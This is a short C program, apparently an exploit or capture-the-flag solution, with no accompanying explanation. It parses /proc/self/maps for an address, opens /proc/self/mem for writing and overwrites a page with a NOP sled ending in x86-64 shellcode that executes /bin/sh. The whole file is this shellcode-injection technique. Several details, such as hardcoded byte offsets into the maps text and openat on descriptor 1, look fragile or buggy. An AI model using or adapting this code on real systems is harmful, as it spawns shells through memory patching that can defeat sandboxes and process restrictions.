#define _POSIX1_SOURCE 2
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <fcntl.h>

char* read_file(char* filename){
  unsigned long length;
  int fd = openat(1, filename, O_RDONLY);
  
  length = lseek(fd, 0, SEEK_END)+1;
  lseek(fd, 0, SEEK_SET);

  if(length == 0){
    length = 6000;
  }

  char *buf = malloc(length);

  read(fd, buf, length);
  write(1, buf, length);
  
  return buf;
}

char* generate_payload(){
  char* payload = malloc(0x1000);
  memset(payload, '\x90', 0x1000);

  char* shellcode = "H\xc7\xc0;\x00\x00\x00H\xbb/bin/sh\x00SH\x89\xe7H1\xf6H1\xd2\x0f\x05";
  memcpy(payload+(0x1000-30), shellcode, 29);

  return payload;
}

int main() {
  unsigned long x;
  char* buf;
  
  buf = read_file("/proc/self/maps");

  buf[111] = '\0';
  x = (unsigned long)strtol(buf+98, NULL, 16);

  int fd = openat(1, "/proc/self/mem", O_WRONLY);

  lseek(fd, x, SEEK_SET);

  char* payload = generate_payload();
  write(fd, payload, 0x1000);

}